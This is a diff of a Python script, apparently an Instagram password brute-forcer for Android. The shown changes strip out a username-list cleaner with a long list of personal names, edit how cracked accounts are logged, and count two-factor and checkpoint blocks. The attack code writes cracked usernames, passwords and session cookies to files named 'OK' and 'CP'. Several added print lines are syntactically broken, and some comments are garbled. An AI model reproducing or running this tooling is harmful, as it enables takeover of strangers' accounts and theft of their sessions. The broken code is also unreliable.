@@ -21,17 +21,7 @@ from concurrent.futures import ThreadPoolExecutor, as_completed
 from rich.console import Console
 
 
-# إزالة الرموز التعبيرية
-def remove_emojis(text):
-    emoji_pattern = re.compile(
-        "[\U0001F600-\U0001F64F\U0001F300-\U0001F5FF"
-        "\U0001F680-\U0001F6FF\U0001F700-\U0001F77F"
-        "\U0001F780-\U0001F7FF\U0001F800-\U0001F8FF"
-        "\U0001F900-\U0001F9FF\U0001FA00-\U0001FA6F"
-        "\U0001FA70-\U0001FAFF\U00002702-\U000027B0"
-        "\U000024C2-\U0001F251]+", flags=re.UNICODE
-    )
-    return emoji_pattern.sub('', text)
+# إزالة الرموز 
 
 import urllib.parse
 from urllib.parse import quote
@@ -103,90 +93,9 @@ import hashlib
 import requests
 from rich.console import Console
 from concurrent.futures import ThreadPoolExecutor, as_completed
- 
-def remove_emojis(text):
-    emoji_pattern = re.compile(
-        "[\U0001F600-\U0001F64F\U0001F300-\U0001F5FF"
-        "\U0001F680-\U0001F6FF\U0001F700-\U0001F77F"
-        "\U0001F780-\U0001F7FF\U0001F800-\U0001F8FF"
-        "\U0001F900-\U0001F9FF\U0001FA00-\U0001FA6F"
-        "\U0001FA70-\U0001FAFF\U00002702-\U000027B0"
-        "\U000024C2-\U0001F251]+", flags=re.UNICODE
-    )
-    return emoji_pattern.sub('', text)
 
 # وظيفة تنظيف الملف
-def clean_file(file_path):
-    arabic_pattern = re.compile(r'[\u0600-\u06FF]')  # الأحرف العربية
-    asian_pattern = re.compile(r'[\u4E00-\u9FFF\uAC00-\uD7AF]')  # الصينية، الكورية، اليابانية
-    unwanted_names = [
-        "soso", "Maram", "mariem", "kawthar", "omayma", "@", "kawthar", "Nadia", "eya", "abir", "nour", "jihed", 
-        "fatma", "Fatma", "yassmin", "nozha", "ranim", "ritej", "Ritej", "Manel", "girl", 
-        "asma", "ASMA", "Asma", "nawara", "+216", "Dayna", "Sirine", "Eya", "Roudayna", 
-        "molkaaa", "Zaineb", "zaineb", "Ranim", "ranim", "Rana", "iline", "chirin", "marym", 
-        "Tayssir", "Islem", "Malouka", "Molka", "Wijdan", "Rahma", "Nour", "Maryouma", 
-        "MOLKA", "Monia", "sroura", "roumaysa", "Rim", "roua", "Farah", "Marwa", "marwa", 
-        "vuvy", "salma", "yassmine", "Mãriem", "Nôûr", "Dorsaf", "Amira", "Chaima", "Noour", 
-        "arwa", ";", ":", "no_ur", "Chayma", "Amel", "maissa", "Nouu_R", "TASSNIM", "Israa", 
-        "Sameh", "Yosra", "Mariem", "Syrinee", "Sameh", "Nahed", "Aya", "ons", "Souha", 
-        "Wissal", "islem", "Amal", "Sarah", "Maysa", "Lina", "Ons", "Tasnim", "Wafee", "Mayssa", 
-        "zayneb", "Kawther", "solo", "Raouf", "Yomna", "Ahlem", "Olfaa", "Nassima", "MârYèm", 
-        "Narjes", "Nawel", "maram", "Rihab", "safee", "zayneebb", "Rihem", "Râhmã", "Zeineb", 
-        "sarra", "Yosr", "Emna", "Nermine", "Rāniā", "rawand", "wafa", "Safsoufa", "Safae", 
-        "Ala", "Safa", "Márÿèeem", "Rania", "Alå", "maryem", "marami", "Noura‍", "Yasmin", "Noor", "noor", "omayma", "hiba", "ibtihel", "Dhia", "takwa", "…", "ela", "#", "amal", "noorr", "isra", "lamiss", "Lamiss", "Amal", "Marouma", "sana", "Ines", "NERMINE", "nermine", "ines", "Lamjjhiss", "Amal", "(", "sara", "mrym", ")"]
-          # الأسماء غير المرغوب فيها
-# ", "Lamjjhiss", "Amal", "("]
-    try:
-        with open(file_path, 'r', encoding='utf-8') as file:
-            lines = file.readlines()
 
-        cleaned_lines = []
-        unique_lines = set()  # لتتبع الأسطر الفريدة
-
-        for line in lines:
-            line = remove_emojis(line)  # إزالة الإيموجي
-
-            # حذف الأسطر التي تحتوي على أحرف عربية أو آسيوية
-            if arabic_pattern.search(line) or asian_pattern.search(line):
-                continue
-
-            # حذف الأسطر التي تحتوي على أسماء غير مرغوب فيها
-            if any(name in line for name in unwanted_names):
-                continue
-
-            # حذف الأسطر التي تكون فارغة بعد |
-            if "|" in line:
-                left, right = line.split("|", 1)
-                if not right.strip():  # إذا كان الجزء الأيمن فارغًا
-                    continue
-
-            # حذف الأسطر المكررة
-            if line in unique_lines:
-                continue
-
-            unique_lines.add(line)  # إضافة السطر إلى المجموعة
-            cleaned_lines.append(line)
-
-        # كتابة الأسطر النظيفة إلى نفس الملف
-        with open(file_path, 'w', encoding='utf-8') as file:
-            file.writelines(cleaned_lines)
-
-        Console().print(f"\n{H2}[✔] : {file_path}\n")
-        Menu()  
-    except Exception as e:
-        print(f"\n[✘] Error cleaning file: {e}\n")
-
-# إزالة الرموز التعبيرية
-def remove_emojis(text):
-    emoji_pattern = re.compile(
-        "[\U0001F600-\U0001F64F\U0001F300-\U0001F5FF"
-        "\U0001F680-\U0001F6FF\U0001F700-\U0001F77F"
-        "\U0001F780-\U0001F7FF\U0001F800-\U0001F8FF"
-        "\U0001F900-\U0001F9FF\U0001FA00-\U0001FA6F"
-        "\U0001FA70-\U0001FAFF\U00002702-\U000027B0"
-        "\U000024C2-\U0001F251]+", flags=re.UNICODE
-    )
-    return emoji_pattern.sub('', text)
 
 import os
 import json
@@ -539,23 +448,21 @@ class Brute:
                         # استخدام القفل أثناء الكتابة
                         with lock:
                             open('/storage/emulated/0/𝐇𝐚𝐜𝐤-𝐢𝐧𝐬𝐭𝐚𝐠𝐫𝐚𝐦/حسابات Ok-CP/حسابات-OK.txt', 'a').write(f'{user}|{pswd}\n{cookie}\n')
-                            console.print(f"\r [bold green]         𖣘─────────────────━﴾𓆩OK𓆪﴿━─────────────────𖣘            \n[bold green]           ├ {user} | {pswd}\n[bold green]           ├ OK:{B2} {self.ok}\n[bold green][🌐]= 𝙲𝙾𝙾𝙺𝙸𝙴𝚂└──>{B2} {cookie}") 
-                            cek_DYNO(user, cookie_file_path)
-                            os.system('espeak -ven+f3 -s 140 -p 70 -a 200 "  Rayen  ,insta  Ok   "')
+                            console.print(f"\r [bold green]         𖣘─────────────────━﴾𓆩OK𓆪﴿━─────────────────𖣘            \n[bold green]           ├ {user} | {pswd}\n[bold green]           ├ OK:{B2} {self.ok}\n[bold green][🌐]= 𝙲𝙾𝙾𝙺𝙸𝙴𝚂└──>{B2} {cookie}\n {J2}         𖣘─────────────────━﴾𓆩XD𓆪﴿━─────────────────𖣘            \n √√√√√√√√✓")") 
+
 
                 
                  elif 'two_factor_required' in str(response.text):
                     self.tw += 1
 
-                    console.print(f"\r {M2}         𖣘─────────────────━﴾𓆩A2F𓆪﴿━─────────────────𖣘            \n{M2}           ├ {user} | {pswd}\n{M2}           ├ A2F:{B2} {self.tw}")     
+                    console.print(f"\r {M2}         𖣘─────────────────━﴾𓆩A2F𓆪﴿━─────────────────𖣘            \n{M2}           ├ {user} | {pswd}\n{M2}           ├ A2F:{B2} {self.tw}\n {J2}         𖣘─────────────────━﴾𓆩XD𓆪﴿━─────────────────𖣘            \n √√√√√√√√✓")")     
                     break
                  elif 'https://i.instagram.com/challenge/' in str(response.text):
 
                     self.cp += 1
                     open('/storage/emulated/0/𝐇𝐚𝐜𝐤-𝐢𝐧𝐬𝐭𝐚𝐠𝐫𝐚𝐦/حسابات Ok-CP/حسابات-CP.txt', 'a').write(f'{user}|{pswd}\n')
-                    console.print(f"\r {K2}         𖣘─────────────────━﴾𓆩CP𓆪﴿━─────────────────𖣘            \n[bold yellow]           ├ {user} | {pswd}\n[bold yellow]           ├ CP:{B2} {self.cp}")     
-                    cek_DYNO(user, cookie_file_path)
-                    os.system('espeak -ven+f3 -s 140 -p 70 -a 200 "  CP "')
+                    console.print(f"\r {K2}         𖣘─────────────────━﴾𓆩CP𓆪﴿━─────────────────𖣘            \n[bold yellow]           ├ {user} | {pswd}\n[bold yellow]           ├ CP:{B2} {self.cp}\n {J2}         𖣘─────────────────━﴾𓆩XD𓆪﴿━─────────────────𖣘            \n √√√√√√√√✓")")     
+
 
                     break
 
@@ -571,7 +478,7 @@ if __name__ == "__main__":
         # تحديد المسارات
         main_folder = '/storage/emulated/0/𝐇𝐚𝐜𝐤-𝐢𝐧𝐬𝐭𝐚𝐠𝐫𝐚𝐦'
         accounts_folder = os.path.join(main_folder, 'حسابات Ok-CP')
-
+        list_folder = os.path.join(main_folder, 'List')
         
         # التحقق من وجود المجلدات وإنشائها إذا لم تكن موجودة
         if not os.path.exists(accounts_folder):
@@ -589,6 +496,9 @@ if __name__ == "__main__":
             with open(os.path.join(accounts_folder, 'حسابات-CP.txt'), 'w') as file:
                 file.write("")
 
+
+        print("")
+
     except Exception as e:
         print(f"حدث خطأ : {e}")
     
@@ -596,4 +506,4 @@ if __name__ == "__main__":
     brute = Brute()  # كائن من الفئة Brute-+--
     Menu()           # عرض القائnnمjjة أو nتنفيذ اyyلخياراتgh
     
-    #bhgوتyyyتتتتناتتjjhhhhy𝚑𝚞𝚞jjووةة
+    #bhgوتyyyتتتتناتتjjhhhhy𝚑𝚞𝚞jjتت
